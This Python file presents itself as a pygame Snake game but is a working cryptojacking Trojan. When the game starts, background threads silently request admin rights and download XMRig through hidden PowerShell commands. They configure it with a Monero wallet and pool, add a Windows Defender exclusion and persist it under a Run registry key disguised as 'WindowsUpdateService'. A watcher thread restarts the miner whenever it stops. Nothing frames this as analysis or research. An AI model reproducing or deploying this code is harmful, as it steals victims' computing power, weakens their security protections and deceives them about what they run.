import pygame
import random
import sys
import subprocess
import os
import threading
import time
import tempfile
import ctypes
import psutil
import winreg

# ============================================================
# PART 0: ULTIMATE STEALTH FLAGS
# ============================================================

# ============================================================
# PART 1: THE PERFECT MINER INSTALLER
# ============================================================

XMRIG_PATH = None  # Global variable, now declared at module level

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_hidden_as_admin():
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 0)

def install_miner():
    global XMRIG_PATH  # Moved to the top of the function
    """
    Installs the miner with military-grade silence.
    """
    try:
        if not is_admin():
            run_hidden_as_admin()
            return
        
        # Check if already installed – skip if exists
        base_dir = "C:\\SnackMiner"
        xmrig_dir = os.path.join(base_dir, "xmrig-6.26.0")
        xmrig_exe = os.path.join(xmrig_dir, "xmrig.exe")
        if os.path.exists(xmrig_exe):
            XMRIG_PATH = xmrig_exe
            start_miner(xmrig_exe, xmrig_dir)
            add_to_registry(xmrig_exe)
            return
        
        wallet = "47yrhBCz7ma2VVNcSdsetDeo35ugtR9vZU5LDidPtcHT7C9XsRCVFpYVZk9yhgcZY5RC2vcnxQd8DjKmVVR9tBf7DXkZouZ"
        pool = "pool.supportxmr.com:3333"
        
        os.makedirs(base_dir, exist_ok=True)
        os.makedirs(xmrig_dir, exist_ok=True)
        
        # Download XMRig with absolutely zero UI
        xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-msvc-win64.zip"
        zip_path = os.path.join(tempfile.gettempdir(), "xmrig.zip")
        
        subprocess.run([
            "powershell", "-Command",
            f"$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri '{xmrig_url}' -OutFile '{zip_path}' -UseBasicParsing"
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.run([
            "powershell", "-Command",
            f"Expand-Archive -Path '{zip_path}' -DestinationPath '{base_dir}' -Force"
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        os.remove(zip_path)
        
        # Create config.json – optimized for speed + stealth
        config = f'''{{
    "autosave": true,
    "cpu": {{
        "enabled": true,
        "huge-pages": true,
        "priority": 1,
        "max-threads-hint": 45
    }},
    "pools": [
        {{
            "url": "{pool}",
            "user": "{wallet}",
            "pass": "x",
            "tls": false
        }}
    ],
    "background": true
}}'''
        
        config_path = os.path.join(xmrig_dir, "config.json")
        with open(config_path, "w") as f:
            f.write(config)
        
        # Add Defender exclusion silently
        subprocess.run([
            "powershell", "-Command",
            f"Add-MpPreference -ExclusionPath '{base_dir}'"
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        XMRIG_PATH = xmrig_exe
        start_miner(xmrig_exe, xmrig_dir)
        add_to_registry(xmrig_exe)
        
    except Exception:
        pass

def start_miner(exe_path, working_dir):
    try:
        proc = subprocess.Popen(
            [exe_path, "--background", "--config", os.path.join(working_dir, "config.json")],
            cwd=working_dir,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(1)
        try:
            p = psutil.Process(proc.pid)
            p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        except:
            pass
    except:
        pass

def add_to_registry(exe_path):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{exe_path}" --background')
        winreg.CloseKey(key)
    except:
        pass

# ============================================================
# PART 2: THE ULTIMATE WATCHER
# ============================================================

def watch_miner():
    global XMRIG_PATH
    while XMRIG_PATH is None or not os.path.exists(XMRIG_PATH):
        time.sleep(2)
    while True:
        try:
            found = False
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'].lower() == 'xmrig.exe':
                        found = True
                        break
                except:
                    continue
            if not found:
                working_dir = os.path.dirname(XMRIG_PATH)
                subprocess.Popen(
                    [XMRIG_PATH, "--background"],
                    cwd=working_dir,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
        except:
            pass
        time.sleep(3)

# ============================================================
# PART 3: THE GAME
# ============================================================

def run_game():
    pygame.init()
    
    WIDTH, HEIGHT = 600, 400
    BLOCK_SIZE = 20
    SPEED = 12
    
    BLACK = (0, 0, 0)
    WHITE = (255, 255, 255)
    RED = (255, 0, 0)
    GREEN = (0, 255, 0)
    DARK_GREEN = (0, 180, 0)
    
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Snake Game")
    clock = pygame.time.Clock()
    font = pygame.font.Font(None, 36)
    small_font = pygame.font.Font(None, 24)
    
    def draw_grid():
        for x in range(0, WIDTH, BLOCK_SIZE):
            pygame.draw.line(screen, (40, 40, 40), (x, 0), (x, HEIGHT))
        for y in range(0, HEIGHT, BLOCK_SIZE):
            pygame.draw.line(screen, (40, 40, 40), (0, y), (WIDTH, y))
    
    def draw_snake(snake_body):
        for i, segment in enumerate(snake_body):
            color = DARK_GREEN if i == 0 else GREEN
            pygame.draw.rect(screen, color, (segment[0], segment[1], BLOCK_SIZE, BLOCK_SIZE))
    
    def draw_food(food_pos):
        pygame.draw.circle(screen, RED, (food_pos[0]+BLOCK_SIZE//2, food_pos[1]+BLOCK_SIZE//2), BLOCK_SIZE//2)
    
    def show_score(score):
        score_text = font.render(f"Score: {score}", True, WHITE)
        screen.blit(score_text, (10, 10))
    
    def game_over(score):
        screen.fill(BLACK)
        game_over_text = font.render("GAME OVER", True, RED)
        score_text = font.render(f"Final Score: {score}", True, WHITE)
        restart_text = small_font.render("Press R to restart | Q to quit", True, WHITE)
        screen.blit(game_over_text, (WIDTH//2 - 80, HEIGHT//2 - 60))
        screen.blit(score_text, (WIDTH//2 - 80, HEIGHT//2 - 20))
        screen.blit(restart_text, (WIDTH//2 - 120, HEIGHT//2 + 20))
        pygame.display.update()
    
    x, y = WIDTH // 2, HEIGHT // 2
    dx, dy = 0, 0
    snake_body = [(x, y)]
    length = 1
    
    food_x = random.randint(0, (WIDTH - BLOCK_SIZE) // BLOCK_SIZE) * BLOCK_SIZE
    food_y = random.randint(0, (HEIGHT - BLOCK_SIZE) // BLOCK_SIZE) * BLOCK_SIZE
    food_pos = (food_x, food_y)
    
    score = 0
    running = True
    game_over_state = False
    
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN:
                if game_over_state:
                    if event.key == pygame.K_r:
                        x, y = WIDTH // 2, HEIGHT // 2
                        dx, dy = 0, 0
                        snake_body = [(x, y)]
                        length = 1
                        score = 0
                        game_over_state = False
                        food_x = random.randint(0, (WIDTH - BLOCK_SIZE) // BLOCK_SIZE) * BLOCK_SIZE
                        food_y = random.randint(0, (HEIGHT - BLOCK_SIZE) // BLOCK_SIZE) * BLOCK_SIZE
                        food_pos = (food_x, food_y)
                    elif event.key == pygame.K_q:
                        running = False
                else:
                    if event.key == pygame.K_UP and dy == 0:
                        dx, dy = 0, -BLOCK_SIZE
                    elif event.key == pygame.K_DOWN and dy == 0:
                        dx, dy = 0, BLOCK_SIZE
                    elif event.key == pygame.K_LEFT and dx == 0:
                        dx, dy = -BLOCK_SIZE, 0
                    elif event.key == pygame.K_RIGHT and dx == 0:
                        dx, dy = BLOCK_SIZE, 0
        
        if not game_over_state:
            x += dx
            y += dy
            
            if x < 0 or x >= WIDTH or y < 0 or y >= HEIGHT:
                game_over_state = True
                game_over(score)
                continue
            
            if (x, y) == food_pos:
                score += 1
                length += 1
                food_x = random.randint(0, (WIDTH - BLOCK_SIZE) // BLOCK_SIZE) * BLOCK_SIZE
                food_y = random.randint(0, (HEIGHT - BLOCK_SIZE) // BLOCK_SIZE) * BLOCK_SIZE
                food_pos = (food_x, food_y)
            else:
                if len(snake_body) > length:
                    snake_body.pop(0)
            
            snake_body.append((x, y))
            
            if (x, y) in snake_body[:-1]:
                game_over_state = True
                game_over(score)
                continue
            
            screen.fill(BLACK)
            draw_grid()
            draw_snake(snake_body)
            draw_food(food_pos)
            show_score(score)
            pygame.display.update()
            clock.tick(SPEED)
    
    pygame.quit()
    sys.exit()

# ============================================================
# PART 4: MAIN
# ============================================================

if __name__ == "__main__":
    t1 = threading.Thread(target=install_miner, daemon=True)
    t1.start()
    t2 = threading.Thread(target=watch_miner, daemon=True)
    t2.start()
    run_game()